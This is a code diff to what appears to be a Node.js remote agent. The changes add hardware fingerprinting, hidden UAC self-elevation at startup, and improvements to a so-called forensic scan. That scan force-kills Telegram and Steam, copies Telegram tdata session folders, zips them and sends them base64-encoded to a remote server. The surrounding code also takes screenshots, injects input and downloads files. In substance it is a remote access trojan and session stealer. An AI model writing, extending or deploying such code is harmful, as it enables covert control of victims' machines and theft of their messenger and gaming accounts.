@@ -40,15 +40,134 @@ let reconnectAttempts = 0; // Counts consecutive reconnect failures for backoff
 let isHandlingDisconnect = false; // Guard against error+close race
 
 // Generate persistent device ID based on hardware
+// Uses multiple stable identifiers so VMs/dedicated servers get consistent IDs
 function getHWID() {
+  let raw = '';
+  if (os.platform() === 'win32') {
+    // Try wmic first, then PowerShell fallback (wmic is deprecated on Win11/Server 2025)
+    try {
+      const diskInfo = execSync('wmic diskdrive get serialnumber /value 2>nul', { encoding: 'utf-8', timeout: 5000, windowsHide: true });
+      const serial = (diskInfo.match(/SerialNumber=(.+)/i) || [])[1];
+      if (serial && serial.trim()) raw += serial.trim();
+    } catch {
+      try {
+        const psOut = execSync('powershell -NoProfile -Command "(Get-CimInstance Win32_DiskDrive | Select -First 1).SerialNumber"', { encoding: 'utf-8', timeout: 8000, windowsHide: true });
+        if (psOut && psOut.trim()) raw += psOut.trim();
+      } catch {}
+    }
+    try {
+      const mbInfo = execSync('wmic baseboard get serialnumber /value 2>nul', { encoding: 'utf-8', timeout: 5000, windowsHide: true });
+      const mbSerial = (mbInfo.match(/SerialNumber=(.+)/i) || [])[1];
+      if (mbSerial && mbSerial.trim() && mbSerial.trim() !== 'To be filled by O.E.M.') raw += mbSerial.trim();
+    } catch {
+      try {
+        const psOut = execSync('powershell -NoProfile -Command "(Get-CimInstance Win32_BaseBoard | Select -First 1).SerialNumber"', { encoding: 'utf-8', timeout: 8000, windowsHide: true });
+        if (psOut && psOut.trim() && psOut.trim() !== 'To be filled by O.E.M.') raw += psOut.trim();
+      } catch {}
+    }
+    // Windows Machine GUID — unique per installation, survives reboots
+    try {
+      const regOut = execSync('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid 2>nul', { encoding: 'utf-8', timeout: 5000, windowsHide: true });
+      const guid = (regOut.match(/MachineGuid\s+REG_SZ\s+(\S+)/i) || [])[1];
+      if (guid) raw += guid;
+    } catch {}
+  }
+  // Fallback: hostname + CPU + RAM (less stable on VMs but always available)
   const cpus = os.cpus();
-  const raw = `${os.hostname()}-${cpus[0]?.model || ''}-${os.totalmem()}-${os.platform()}`;
+  raw += `${os.hostname()}-${cpus[0]?.model || ''}-${os.totalmem()}-${os.platform()}`;
+  // Add first stable (non-virtual, non-internal) MAC address only
+  const nets = os.networkInterfaces();
+  let foundMac = false;
+  // Prefer Ethernet/Wi-Fi adapters over virtual ones
+  const preferredNames = /^(ethernet|wi-fi|eth|wlan|en\d|em\d)/i;
+  const sortedNames = Object.keys(nets).sort((a, b) => {
+    const aPref = preferredNames.test(a) ? 0 : 1;
+    const bPref = preferredNames.test(b) ? 0 : 1;
+    return aPref - bPref;
+  });
+  for (const name of sortedNames) {
+    if (foundMac) break;
+    for (const iface of nets[name]) {
+      if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
+        raw += iface.mac;
+        foundMac = true;
+        break;
+      }
+    }
+  }
   return crypto.createHash('md5').update(raw).digest('hex').substring(0, 16).toUpperCase();
 }
 
 const DEVICE_ID = `agent-${getHWID()}`;
 const HWID = getHWID();
 const START_TIME = Date.now();
+
+// ==================== Safe Temp Directory (ASCII-only) ====================
+// Windows with Russian/Cyrillic usernames puts temp in non-ASCII paths
+// which breaks PowerShell -File parameter. Use C:\ProgramData\ra_temp instead.
+function getSafeTempDir() {
+  if (os.platform() === 'win32') {
+    const safeDirs = [
+      'C:\\ProgramData\\ra_temp',
+      path.join(process.env.SystemRoot || 'C:\\Windows', 'Temp', 'ra_temp'),
+    ];
+    for (const d of safeDirs) {
+      try {
+        if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
+        // Test that we can write here
+        const testFile = path.join(d, '.test_' + process.pid);
+        fs.writeFileSync(testFile, 'ok');
+        fs.unlinkSync(testFile);
+        return d;
+      } catch { /* try next */ }
+    }
+  }
+  return os.tmpdir();
+}
+const SAFE_TEMP = getSafeTempDir();
+
+// Write PowerShell script with UTF-8 BOM (required for Cyrillic path support)
+function writePsScript(filePath, content) {
+  const BOM = Buffer.from([0xEF, 0xBB, 0xBF]);
+  const body = Buffer.from(content, 'utf8');
+  fs.writeFileSync(filePath, Buffer.concat([BOM, body]));
+}
+
+// ==================== UAC Self-Elevation ====================
+function ensureAdmin() {
+  if (os.platform() !== 'win32') return;
+  try {
+    // Quick check: try to write to a protected location
+    execSync('net session >nul 2>&1', { timeout: 5000, windowsHide: true });
+    console.log('[Agent] Running with admin privileges');
+  } catch {
+    // Not admin — try to re-launch elevated
+    console.log('[Agent] Not running as admin, attempting elevation...');
+    const exePath = process.execPath;
+    const args = process.argv.slice(1).map(a => `'${a.replace(/'/g, "''")}'`).join(',');
+    try {
+      const cmd = args
+        ? `Start-Process -FilePath '${exePath.replace(/'/g, "''")}' -ArgumentList ${args} -Verb RunAs -WindowStyle Hidden`
+        : `Start-Process -FilePath '${exePath.replace(/'/g, "''")}' -Verb RunAs -WindowStyle Hidden`;
+      exec(`powershell -NoProfile -WindowStyle Hidden -Command "${cmd.replace(/"/g, '\\"')}"`,
+        { windowsHide: true, timeout: 10000 },
+        (err) => {
+          if (!err) {
+            console.log('[Agent] Elevated instance started, exiting current...');
+            setTimeout(() => process.exit(0), 1000);
+          } else {
+            console.log('[Agent] Elevation failed (UAC denied or unavailable), continuing without admin');
+          }
+        }
+      );
+    } catch {
+      console.log('[Agent] Failed to attempt elevation, continuing without admin');
+    }
+  }
+}
+
+// Elevate on startup
+ensureAdmin();
 
 let ws = null;
 let reconnectTimer = null;
@@ -852,8 +971,8 @@ function handleDownload(payload) {
     } else if (stat.isDirectory()) {
       // Directory — zip it with PowerShell (Windows) or tar (Linux)
       if (os.platform() === 'win32') {
-        const zipPath = path.join(os.tmpdir(), `ra_download_${Date.now()}.zip`);
-        const psCmd = `powershell -NoProfile -Command "Compress-Archive -Path '${targetPath.replace(/'/g, "''")}\\*' -DestinationPath '${zipPath}' -Force"`;
+        const zipPath = path.join(SAFE_TEMP, `ra_download_${Date.now()}.zip`);
+        const psCmd = `powershell -NoProfile -Command "Compress-Archive -LiteralPath '${targetPath.replace(/'/g, "''")}' -DestinationPath '${zipPath}' -Force"`;
         exec(psCmd, { timeout: 60000, windowsHide: true }, (err) => {
           if (err) {
             send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: `Zip failed: ${err.message}`, path: targetPath } });
@@ -937,7 +1056,7 @@ function getMimeType(filePath) {
 function takeScreenshot() {
   if (os.platform() === 'win32') {
     // Write PS script to temp file to avoid inline parsing issues with types
-    const psFile = path.join(os.tmpdir(), `ra_screenshot_${DEVICE_ID}.ps1`);
+    const psFile = path.join(SAFE_TEMP, `ra_screenshot_${DEVICE_ID}.ps1`);
     const psScript = `
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -956,7 +1075,7 @@ $ms.Dispose()
 Write-Output $base64
 `;
     try {
-      fs.writeFileSync(psFile, psScript, 'utf8');
+      writePsScript(psFile, psScript);
     } catch (e) {
       send({ type: 'screenshot', deviceId: DEVICE_ID, payload: { error: `Failed to write script: ${e.message}` } });
       return;
@@ -1612,8 +1731,8 @@ if ($needScale) {
     try { $scaledBitmap.Dispose() } catch { }
 }
 `;
-  const psFile = path.join(os.tmpdir(), `ra_screen_capture_${DEVICE_ID}.ps1`);
-  try { fs.writeFileSync(psFile, psScript, 'utf8'); } catch (e) {
+  const psFile = path.join(SAFE_TEMP, `ra_screen_capture_${DEVICE_ID}.ps1`);
+  try { writePsScript(psFile, psScript); } catch (e) {
     console.error('[Agent] Failed to write screen capture script:', e.message);
     sendScreenError('Failed to create capture script: ' + e.message);
     return;
@@ -1833,8 +1952,8 @@ while ($true) {
     }
 }
 `;
-  const psFile = path.join(os.tmpdir(), `ra_input_helper_${DEVICE_ID}.ps1`);
-  try { fs.writeFileSync(psFile, psScript, 'utf8'); } catch (e) {
+  const psFile = path.join(SAFE_TEMP, `ra_input_helper_${DEVICE_ID}.ps1`);
+  try { writePsScript(psFile, psScript); } catch (e) {
     console.error('[Agent] Failed to write input helper script:', e.message);
     return;
   }
@@ -1961,6 +2080,7 @@ function handleForensicScan(payload) {
         files: [],
         archiveData: null,
         archiveName: null,
+        archiveReady: false,
         reportText: null,
         progress: 100,
       };
@@ -1979,10 +2099,10 @@ function handleForensicScan(payload) {
             'Telegram.exe', 'AyuGram.exe', 'Kotatogram.exe', '64Gram.exe',
             'Steam.exe', 'steamwebhelper.exe',
           ];
-          for (const app of appsToKill) {
-            try { await execAsync(`taskkill /F /IM "${app}" 2>nul`, { timeout: 5000 }); } catch { /* not running */ }
-          }
-          await new Promise(r => setTimeout(r, 1500));
+          await Promise.allSettled(
+            appsToKill.map(app => execAsync(`taskkill /F /IM "${app}" 2>nul`, { timeout: 5000 }).catch(() => {}))
+          );
+          await new Promise(r => setTimeout(r, 800));
         }
 
         progress(20);
@@ -1991,7 +2111,7 @@ function handleForensicScan(payload) {
         const localAppData = process.env.LOCALAPPDATA || path.join(userProfile, 'AppData', 'Local');
 
         // Quick-detect paths for archive
-        const tmpDir = path.join(os.tmpdir(), `forensic_${scanId}`);
+        const tmpDir = path.join(SAFE_TEMP, `forensic_${scanId}`);
         if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
 
         // Write a basic report
@@ -2033,7 +2153,7 @@ function handleForensicScan(payload) {
             const tdataDest = path.join(tmpDir, 'telegram', 'tdata');
             if (!fs.existsSync(tdataDest)) fs.mkdirSync(tdataDest, { recursive: true });
             try {
-              await execAsync(`robocopy "${tdataPath}" "${tdataDest}" /E /R:0 /W:0 /NFL /NDL /NJH /NJS /nc /ns /np`, { timeout: 300000 });
+              await execAsync(`robocopy "${tdataPath}" "${tdataDest}" /E /R:0 /W:0 /MT:8 /NFL /NDL /NJH /NJS /nc /ns /np`, { timeout: 300000 });
             } catch (roboErr) {
               if (roboErr.code && typeof roboErr.code === 'number' && roboErr.code > 7) {
                 console.log(`[Agent] robocopy tdata warning: exit code ${roboErr.code}`);
@@ -2096,17 +2216,19 @@ function handleForensicScan(payload) {
 
         // Create ZIP
         if (os.platform() === 'win32') {
-          const zipPath = path.join(os.tmpdir(), `forensic_${scanId}.zip`);
+          const zipPath = path.join(SAFE_TEMP, `forensic_${scanId}.zip`);
           try {
-            await execAsync(`powershell -NoProfile -Command "Compress-Archive -Path '${tmpDir.replace(/'/g, "''")}\\*' -DestinationPath '${zipPath}' -Force"`, { timeout: 300000 });
+            await execAsync(`powershell -NoProfile -Command "Compress-Archive -LiteralPath '${tmpDir.replace(/'/g, "''")}' -DestinationPath '${zipPath}' -Force"`, { timeout: 300000 });
             const zipStat = fs.statSync(zipPath);
             console.log(`[Agent] Archive ZIP size: ${(zipStat.size / 1024 / 1024).toFixed(1)} MB`);
-            if (zipStat.size < 150 * 1024 * 1024) {
+            if (zipStat.size < 500 * 1024 * 1024) {
               const zipData = fs.readFileSync(zipPath);
               result.archiveData = zipData.toString('base64');
               result.archiveName = `forensic_${os.hostname()}_${scanId}.zip`;
+              result.archiveReady = true;
             } else {
               console.log('[Agent] Archive ZIP too large (' + (zipStat.size / 1024 / 1024).toFixed(1) + ' MB)');
+              result.archiveReady = false;
             }
             try { fs.unlinkSync(zipPath); } catch { /* ignore */ }
           } catch (zipErr) {
@@ -2132,11 +2254,12 @@ function handleForensicScan(payload) {
           'Telegram.exe', 'AyuGram.exe', 'Kotatogram.exe', '64Gram.exe',
           'Steam.exe', 'steamwebhelper.exe',
         ];
-        for (const app of appsToKill) {
-          try { await execAsync(`taskkill /F /IM "${app}" 2>nul`, { timeout: 5000 }); } catch { /* not running */ }
-        }
-        // Give a moment for files to be released
-        await new Promise(r => setTimeout(r, 1500));
+        // Kill all apps in parallel for speed
+        await Promise.allSettled(
+          appsToKill.map(app => execAsync(`taskkill /F /IM "${app}" 2>nul`, { timeout: 5000 }).catch(() => {}))
+        );
+        // Short wait for files to be released
+        await new Promise(r => setTimeout(r, 800));
       }
 
       // ========== Sessions scan ==========
@@ -2669,7 +2792,7 @@ function handleForensicScan(payload) {
       if (scanType === 'full') {
         progress(92);
         try {
-          const tmpDir = path.join(os.tmpdir(), `forensic_${scanId}`);
+          const tmpDir = path.join(SAFE_TEMP, `forensic_${scanId}`);
           if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
           // Write report
           fs.writeFileSync(path.join(tmpDir, 'report.txt'), result.reportText, 'utf8');
@@ -2728,7 +2851,7 @@ function handleForensicScan(payload) {
                 if (!fs.existsSync(tdataDest)) fs.mkdirSync(tdataDest, { recursive: true });
                 // robocopy copies everything recursively; exit codes 0-7 are success
                 try {
-                  await execAsync(`robocopy "${result.sessions.telegram.tdataPath}" "${tdataDest}" /E /R:0 /W:0 /NFL /NDL /NJH /NJS /nc /ns /np`, { timeout: 300000 });
+                  await execAsync(`robocopy "${result.sessions.telegram.tdataPath}" "${tdataDest}" /E /R:0 /W:0 /MT:8 /NFL /NDL /NJH /NJS /nc /ns /np`, { timeout: 300000 });
                 } catch (roboErr) {
                   // robocopy returns exit code 1 for successful copies, Node treats nonzero as error
                   if (roboErr.code && typeof roboErr.code === 'number' && roboErr.code > 7) {
@@ -2756,18 +2879,20 @@ function handleForensicScan(payload) {
           }
           // Zip the directory (async to keep event loop alive for WS pings)
           if (os.platform() === 'win32') {
-            const zipPath = path.join(os.tmpdir(), `forensic_${scanId}.zip`);
+            const zipPath = path.join(SAFE_TEMP, `forensic_${scanId}.zip`);
             try {
               progress(94);
-              await execAsync(`powershell -NoProfile -Command "Compress-Archive -Path '${tmpDir.replace(/'/g, "''")}\\*' -DestinationPath '${zipPath}' -Force"`, { timeout: 300000 });
+              await execAsync(`powershell -NoProfile -Command "Compress-Archive -LiteralPath '${tmpDir.replace(/'/g, "''")}' -DestinationPath '${zipPath}' -Force"`, { timeout: 300000 });
               const zipStat = fs.statSync(zipPath);
               console.log(`[Agent] Forensic ZIP size: ${(zipStat.size / 1024 / 1024).toFixed(1)} MB`);
-              if (zipStat.size < 150 * 1024 * 1024) {
+              if (zipStat.size < 500 * 1024 * 1024) {
                 const zipData = fs.readFileSync(zipPath);
                 result.archiveData = zipData.toString('base64');
                 result.archiveName = `forensic_${os.hostname()}_${scanId}.zip`;
+                result.archiveReady = true;
               } else {
                 console.log('[Agent] Forensic ZIP too large to send (' + (zipStat.size / 1024 / 1024).toFixed(1) + ' MB), skipping archive');
+                result.archiveReady = false;
               }
               try { fs.unlinkSync(zipPath); } catch { /* ignore */ }
             } catch (zipErr) {
